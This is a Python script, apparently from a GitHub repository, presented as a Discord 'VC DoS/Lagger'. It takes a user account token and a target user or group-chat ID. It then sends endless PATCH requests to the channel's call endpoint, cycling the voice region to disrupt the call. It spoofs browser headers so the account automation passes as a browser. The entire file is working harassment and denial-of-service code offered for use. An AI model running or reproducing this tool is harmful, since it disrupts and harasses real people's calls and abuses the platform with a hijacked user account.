########################################################
#         .---. .----..----..-..-..---..---.           #
#         | |-< | || || || | \  / | |- | |-<           #
#         `-'`-'`----'`----'  `'  `---'`-'`-           #
########################################################
#  https://github.com/RooverPY/VCDoS/blob/main/dos.py  #
########################################################
import os
from datetime import datetime
import asyncio
import itertools
import getpass
try:
	import aiohttp
except ImportError:
	os.system("pip install aiohttp") # I am aware this is unsafe.
try:
	import httpx
except ImportError:
	os.system("pip install httpx")
try:
	import aioconsole
except ImportError:
	os.system("pip install aioconsole")
if os.name != "nt":
	try:
		import uvloop
	except ImportError:
		os.system("pip install uvloop")
	uvloop.install()
	asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
os.system("cls" if os.name == "nt" else "clear")
########################################################
class coloring:
	
	MAGENTA = '\033[95m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	WHITE = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
########################################################
regions = ["brazil", "hongkong", "russia", "india", 'japan', 'sydney', 'singapore']
reg = itertools.cycle(regions)

async def execute(token, port):
	async with aiohttp.ClientSession() as session:
		while True:
			r = await session.patch(url=f"https://discord.com/api/v9/channels/{port}/call", json={"region":next(reg)}, headers={"user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", 'authorization': token})
			if r.status == 204:
				await aioconsole.aprint(f"{coloring.GREEN}<==========[Request Successful: {r.status}==========>")
			else: 
				await aioconsole.aprint(f"{coloring.RED}<==========[Request Status: {r.status}==========>")
			
def main(token):
	now = datetime.now()
	current_time = now.strftime("%H:%M:%S")
	print(f"Connected to: DoS.py | The Current Time is: {current_time} | Version: 2")
	print(f"{coloring.BLUE}-"*64)
	print(f"""{coloring.GREEN}
	  _    _  ______ _____           __  
	 | |  | |/ _____|____ \         / /   
	 | |  | | /      _   \ \ ___    \ \  
	  \ \/ /| |     | |   | / _ \    \ \ 
	   \  / | \_____| |__/ / |_| |____) )
		\/   \______)_____/ \___(______/ 
		VC DoS/Lagger by Roover          
	  """)
	print(f"{coloring.BLUE}-"*64)
	choice = input(f"{coloring.GREEN}Enter Target Type: DM/GC: ")
	id = input("Enter Target ID: ")
	print("\n")
	if choice.lower() == "dm":
		res = httpx.post("https://discord.com/api/v9/users/@me/channels", json={ "recipients": [id]}, headers={"user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", 'authorization': token}).json()
		dmid = res['id']
		asyncio.run(execute(token, dmid))
	elif choice.lower() == "gc":
		asyncio.run(execute(token, id))

if __name__ == "__main__":
	token = input(f"""\n{coloring.BLUE}┌──{coloring.BLUE}「{coloring.RED}Enter[Ω]Token{coloring.BLUE}」-[{coloring.YELLOW}!{coloring.BLUE}]{coloring.WHITE}:{coloring.BLUE}
└─{coloring.MAGENTA}${coloring.WHITE}: """)
	os.system("cls" if os.name == "nt" else "clear")
	r = httpx.get("https://discord.com/api/v9/users/@me/library", headers={"x-super-properties": "eyJvcyI6IiIsImJyb3dzZXIiOiJDaHJvbWUiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBDck9TIGFhcmNoNjQgMTQzMjQuODAuMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk3LjAuNDY5Mi4xMDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijk3LjAuNDY5Mi4xMDIiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50Ijoid3d3Lmdvb2dsZS5jb20iLCJzZWFyY2hfZW5naW5lX2N1cnJlbnQiOiJnb29nbGUiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMTM1ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9", "user-agent": "Mozilla/5.0 (X11; CrOS aarch64 14324.80.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.102 Safari/537.36", "authorization": token})
	if r.status_code == 200 or r.status_code == 204:
		pass
	else:
		print(f"{coloring.RED}Invalid user token provided. Join https://discord.gg/8NFesgFaYb for support.")
		quit()
	main(token)
